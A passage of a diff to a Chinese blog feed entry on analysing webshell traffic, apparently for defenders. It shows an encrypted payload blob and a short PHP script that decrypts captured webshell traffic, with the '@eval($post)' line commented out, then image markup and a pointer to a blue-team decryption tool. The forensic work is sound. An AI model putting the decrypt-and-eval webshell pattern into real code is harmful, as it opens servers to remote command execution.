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&amp;#34;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;$post=Decrypt($Content);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;var_dump($post);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;//@eval($post);
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;?&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://lserein.github.io/p/webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/14.png&#34;
+	width=&#34;2535&#34;
+	height=&#34;752&#34;
+	srcset=&#34;https://lserein.github.io/p/webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/14_hu_f76023be5245e7cf.png 480w, https://lserein.github.io/p/webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/14_hu_d20b9baa8d1a9390.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;img&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;337&#34;
+		data-flex-basis=&#34;809px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;运行这个脚本，会生成一段base64的值拿去解密，$cmd中的内容就是攻击者具体执行的命令&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://lserein.github.io/p/webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/15.png&#34;
+	width=&#34;1897&#34;
+	height=&#34;978&#34;
+	srcset=&#34;https://lserein.github.io/p/webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/15_hu_df413c0d5f80182f.png 480w, https://lserein.github.io/p/webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/15_hu_50076ec022689b60.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;img&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;193&#34;
+		data-flex-basis=&#34;465px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://lserein.github.io/p/webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/16.png&#34;
+	width=&#34;1247&#34;
+	height=&#34;636&#34;
+	srcset=&#34;https://lserein.github.io/p/webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/16_hu_79c7ca2e08f0ba71.png 480w, https://lserein.github.io/p/webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/16_hu_ecc3387180a83a3d.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;img&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;196&#34;
+		data-flex-basis=&#34;470px&#34;
+	
+&gt;&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;使用abc大佬写的蓝队辅助分析工具箱工具进行解密&lt;/strong&gt;&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;项目地址：&lt;/strong&gt;&lt;a class=&#34;link&#34; href=&#34;https://github.com/abc123info/BlueTeamTools&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
     &gt;&lt;strong&gt;https://github.com/abc123info/BlueTeamTools&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;将加密的请求包内容使用工具进行解密即可查看源码&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://lserein.github.io/p/webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/11.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://lserein.github.io/p/webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/17.png&#34;
 	width=&#34;2268&#34;
 	height=&#34;1171&#34;
-	srcset=&#34;https://lserein.github.io/p/webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/11_hu_148b2411185b16ba.png 480w, https://lserein.github.io/p/webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/11_hu_f74851340f667a4d.png 1024w&#34;
+	srcset=&#34;https://lserein.github.io/p/webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/17_hu_148b2411185b16ba.png 480w, https://lserein.github.io/p/webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/17_hu_f74851340f667a4d.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;img&#34;
@@ -2326,10 +3189,10 @@
 		data-flex-basis=&#34;464px&#34;
 	
 &gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://lserein.github.io/p/webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/12.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://lserein.github.io/p/webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/18.png&#34;
 	width=&#34;2042&#34;
 	height=&#34;1194&#34;
-	srcset=&#34;https://lserein.github.io/p/webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/12_hu_7c6cf7f876e4fcda.png 480w, https://lserein.github.io/p/webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/12_hu_eacd125bf9b3598b.png 1024w&#34;
+	srcset=&#34;https://lserein.github.io/p/webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/18_hu_7c6cf7f876e4fcda.png 480w, https://lserein.github.io/p/webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/18_hu_eacd125bf9b3598b.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;img&#34;
@@ -2338,6 +3201,20 @@
 		class=&#34;gallery-image&#34; 
 		data-flex-grow=&#34;171&#34;
 		data-flex-basis=&#34;410px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://lserein.github.io/p/webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/19.png&#34;
+	width=&#34;2052&#34;
+	height=&#34;1215&#34;
+	srcset=&#34;https://lserein.github.io/p/webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/19_hu_db9175fb18e57db.png 480w, https://lserein.github.io/p/webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/19_hu_87c2b7acf8600b3b.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;img&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;168&#34;
+		data-flex-basis=&#34;405px&#34;
 	
 &gt;&lt;/p&gt;
 </description>
